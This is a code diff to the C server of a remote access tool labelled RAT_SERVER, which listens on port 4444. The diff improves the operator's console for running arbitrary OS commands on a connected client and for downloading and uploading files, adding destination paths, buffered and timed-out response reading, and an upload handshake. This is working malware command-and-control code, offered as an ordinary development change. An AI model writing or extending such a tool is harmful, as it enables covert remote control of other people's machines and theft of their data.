@@ -6,6 +6,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/wait.h>
+#include <sys/stat.h>
 #include <signal.h>
 
 #define PORT 4444
@@ -28,12 +29,12 @@ void print_banner() {
     printf("Commands:\n");
     printf("======================================================\n");
     printf("System:\n");
-    printf("  help                    show this help menu\n");
-    printf("  <any_command>           execute any OS command\n");
-    printf("  exit                    terminate session\n");
+    printf("  help                                 show this help menu\n");
+    printf("  <any_command>                        execute any OS command\n");
+    printf("  exit                                 terminate session\n");
     printf("\nFiles:\n");
-    printf("  download <file>         download file from client\n");
-    printf("  upload <file>           upload file to client\n");
+    printf("  download <remote_file> [local_dest]  download file from client\n");
+    printf("  upload <local_file> [remote_dest]    upload file to client\n");
     printf("\nNotes:\n");
     printf("  All standard OS commands work (ls, pwd, cd, etc.)\n");
     printf("  Windows commands work too (dir, type, etc.)\n");
@@ -101,7 +102,10 @@ int accept_client(RAT_SERVER *server) {
 }
 
 void send_command(RAT_SERVER *server, const char *command) {
-    int bytes_sent = send(server->client_fd, command, strlen(command), 0);
+    char command_with_newline[MAX_COMMAND_SIZE + 2];
+    snprintf(command_with_newline, sizeof(command_with_newline), "%s\n", command);
+    
+    int bytes_sent = send(server->client_fd, command_with_newline, strlen(command_with_newline), 0);
     if (bytes_sent <= 0) {
         printf("Error: Failed to send command to client\n");
     }
@@ -109,37 +113,93 @@ void send_command(RAT_SERVER *server, const char *command) {
 
 void receive_response(RAT_SERVER *server) {
     char buffer[BUFFER_SIZE];
+    char full_response[BUFFER_SIZE * 4] = {0};
     int bytes_received;
+    int total_received = 0;
+    int max_response_size = sizeof(full_response) - 1;
     
-    memset(buffer, 0, BUFFER_SIZE);
-    bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE - 1, 0);
+    // Set socket to non-blocking temporarily to handle timeouts
+    struct timeval timeout;
+    timeout.tv_sec = 1;  // 1 second timeout
+    timeout.tv_usec = 0;
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
     
-    if (bytes_received > 0) {
-        buffer[bytes_received] = '\0';
-        printf("%s", buffer);  // Print response with prompt included
+    while (total_received < max_response_size) {
+        memset(buffer, 0, BUFFER_SIZE);
+        bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE - 1, 0);
+        
+        if (bytes_received > 0) {
+            buffer[bytes_received] = '\0';
+            
+            // Check if we have space to append
+            if (total_received + bytes_received < max_response_size) {
+                strcat(full_response, buffer);
+                total_received += bytes_received;
+            } else {
+                // Truncate if response is too large
+                strncat(full_response, buffer, max_response_size - total_received - 1);
+                total_received = max_response_size - 1;
+                strcat(full_response, "\n[Output truncated - too large]");
+                break;
+            }
+            
+            // If this is a small packet, it's likely the end
+            if (bytes_received < BUFFER_SIZE - 1) {
+                break;
+            }
+        } else if (bytes_received == 0) {
+            printf("\nClient disconnected\n");
+            break;
+        } else {
+            // Error or timeout - likely end of response
+            break;
+        }
+    }
+    
+    // Reset socket to blocking mode
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 0;
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    
+    if (total_received > 0) {
+        printf("%s", full_response);
         fflush(stdout);
-    } else if (bytes_received == 0) {
-        printf("\nClient disconnected\n");
-    } else {
-        perror("Receive failed");
     }
 }
 
-void handle_download(RAT_SERVER *server, const char *filename) {
+void handle_download(RAT_SERVER *server, const char *remote_filename, const char *local_destination) {
     FILE *file;
     char buffer[BUFFER_SIZE];
     int bytes_received;
-    char filepath[256];
+    char filepath[512];
     
-    // Extract just the filename from path
-    const char *base_filename = strrchr(filename, '/');
-    if (base_filename) {
-        base_filename++; // Skip the '/'
+    // Determine local file path
+    if (local_destination && strlen(local_destination) > 0) {
+        // Check if destination is a directory
+        struct stat st;
+        if (stat(local_destination, &st) == 0 && S_ISDIR(st.st_mode)) {
+            // Destination is a directory, append filename
+            const char *base_filename = strrchr(remote_filename, '/');
+            if (base_filename) {
+                base_filename++; // Skip the '/'
+            } else {
+                base_filename = remote_filename;
+            }
+            snprintf(filepath, sizeof(filepath), "%s/%s", local_destination, base_filename);
+        } else {
+            // Destination is a full file path
+            strcpy(filepath, local_destination);
+        }
     } else {
-        base_filename = filename;
+        // No destination specified, use current directory with base filename
+        const char *base_filename = strrchr(remote_filename, '/');
+        if (base_filename) {
+            base_filename++; // Skip the '/'
+        } else {
+            base_filename = remote_filename;
+        }
+        snprintf(filepath, sizeof(filepath), "./%s", base_filename);
     }
-    
-    snprintf(filepath, sizeof(filepath), "./%s", base_filename);
     
     file = fopen(filepath, "wb");
     if (!file) {
@@ -147,7 +207,11 @@ void handle_download(RAT_SERVER *server, const char *filename) {
         return;
     }
     
-    printf("Downloading file: %s\n", filename);
+    printf("Downloading file: %s", remote_filename);
+    if (local_destination && strlen(local_destination) > 0) {
+        printf(" to %s", filepath);
+    }
+    printf("\n");
     
     while ((bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
         fwrite(buffer, 1, bytes_received, file);
@@ -160,10 +224,11 @@ void handle_download(RAT_SERVER *server, const char *filename) {
     printf("File downloaded successfully as: %s\n", filepath);
 }
 
-void handle_upload(RAT_SERVER *server, const char *filename) {
+void handle_upload(RAT_SERVER *server, const char *filename, const char *destination) {
     FILE *file;
     char buffer[BUFFER_SIZE];
     size_t bytes_read;
+    char upload_info[512];
     
     file = fopen(filename, "rb");
     if (!file) {
@@ -171,11 +236,31 @@ void handle_upload(RAT_SERVER *server, const char *filename) {
         return;
     }
     
-    printf("Uploading file: %s\n", filename);
+    printf("Uploading file: %s", filename);
+    if (destination && strlen(destination) > 0) {
+        printf(" to %s", destination);
+    }
+    printf("\n");
     
-    // Send filename first
-    send(server->client_fd, filename, strlen(filename), 0);
-    usleep(100000); // Small delay
+    // Send destination path and filename in format "destination|filename" followed by newline
+    if (destination && strlen(destination) > 0) {
+        snprintf(upload_info, sizeof(upload_info), "%s|%s\n", destination, filename);
+    } else {
+        // Extract just the filename for default location
+        const char *base_filename = strrchr(filename, '/');
+        if (base_filename) {
+            base_filename++; // Skip the '/'
+        } else {
+            base_filename = filename;
+        }
+        snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
+    }
+    
+    send(server->client_fd, upload_info, strlen(upload_info), 0);
+    
+    // Wait for acknowledgment from client before sending file content
+    char ack[10];
+    recv(server->client_fd, ack, sizeof(ack), 0);
     
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
@@ -195,7 +280,7 @@ void execute_commands(RAT_SERVER *server) {
     print_banner();
     
     // Wait for initial prompt from client
-    printf("Waiting for client to connect...\n");
+    printf("Waiting for client prompt...\n");
     receive_response(server);
     printf("\n");
     
@@ -230,22 +315,34 @@ void execute_commands(RAT_SERVER *server) {
         }
         else if (strcmp(args[0], "download") == 0) {
             if (arg_count < 2) {
-                printf("Usage: download <filename>\n");
+                printf("Usage: download <remote_file> [local_destination]\n");
+                printf("  remote_file       - path to file on client to download\n");
+                printf("  local_destination - optional local path where to save file\n");
                 continue;
             }
             send_command(server, command);
-            handle_download(server, args[1]);
+            if (arg_count >= 3) {
+                handle_download(server, args[1], args[2]);  // With destination
+            } else {
+                handle_download(server, args[1], NULL);     // Default location
+            }
             // Wait for confirmation from client
             receive_response(server);
             printf("\n");
         }
         else if (strcmp(args[0], "upload") == 0) {
             if (arg_count < 2) {
-                printf("Usage: upload <filename>\n");
+                printf("Usage: upload <local_file> [remote_destination]\n");
+                printf("  local_file         - path to file on server to upload\n");
+                printf("  remote_destination - optional path on client where to save file\n");
                 continue;
             }
             send_command(server, "upload");
-            handle_upload(server, args[1]);
+            if (arg_count >= 3) {
+                handle_upload(server, args[1], args[2]);  // With destination
+            } else {
+                handle_upload(server, args[1], NULL);     // Default location
+            }
             // Wait for confirmation from client
             receive_response(server);
             printf("\n");
